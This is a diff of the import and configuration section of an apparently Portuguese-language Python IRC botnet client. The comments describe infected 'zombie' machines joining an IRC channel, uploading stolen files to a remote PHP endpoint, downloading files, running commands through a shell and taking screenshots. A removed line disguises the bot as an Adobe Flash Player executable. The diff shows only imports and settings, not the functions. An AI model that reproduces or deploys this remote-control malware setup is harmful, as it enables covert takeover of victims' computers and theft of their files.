@@ -1,31 +1,31 @@
 #!/usr/bin/python
 
-import glob # For function listArq(): list files on the computer
-import os
-import platform # For variable pcName
-import random # For variable pcName
-import requests # For function upload(): File Upload
-import re # For function getPublicIp(): Ip Location
-import socket # For function conn(): && ipLocal():
-import subprocess # For function run(): to execute program
-import sys
-from urllib import urlopen # For function getPublicIp(): Ip Location
-import urllib,urllib2 # For function download(): downloading files via http
-import time, datetime# For function screenshot():
+import glob                                       # Funcao listArq()
+import os                                         # Funcoes deleteFile(), listArq(), upload(),
+import platform                                   # Variavel pcName
+import random                                     # Variavel pcName
+import requests                                   # Funcao upload()
+import re                                         # Funcao getPublicIp()
+import socket                                     # Funcoes  conn(), ipLocal()
+import subprocess                                 # Funcao run()
+import sys                                        # Opcao matar
+from urllib import urlopen                        # Funcao getPublicIp()
+import urllib,urllib2                             # Funcao download()
+import time                                       # Funcoes listArq(), shell(), main()
 
 
 # ----------------------------------------------------------#
 #                 C O N F I G U R A C O E S                 #
 # ----------------------------------------------------------#
 
-ircServer= "chat.freenode.net"	# Address Server Irc
-ircChanne= "#amarula4242"			# Channel for Bot connect
-ircPwdCha= "@nolimits42"					# Password of Channel, if there enter the password or leave blank
-botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
-botPass= "raise"				# Not obligatory. A name for the welcome help
-#dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
-urlUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
-urlStrip = urlUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
+ircServer= "chat.freenode.net"                    # Endereco do servidor IRC.
+ircChanne= "#amarula4242"                         # Canal ao qual o Zumbi ira se conectar.
+ircPwdCha= "@nolimits42"                          # Password do canal, caso nao haja, deixar em branco.
+botAdmi= "Papa Father"                            # Nome que os Zumbis usarao para chamar voce (nao obrigatorio)
+botPass= "raise"                                  # Password para se conectar aos bots no canal
+urlUpload = "https://seusite.com/upload.php"      # Array PHP que ira receber os arquivos via upload
+urlStrip = urlUpload.strip('http:upload.php')     # Variable that receives the URL to display uploaded files
+
 
 # ----------------------------------------------------------#
 #          F U N C O E S   O P E R A C I O N A I S          #
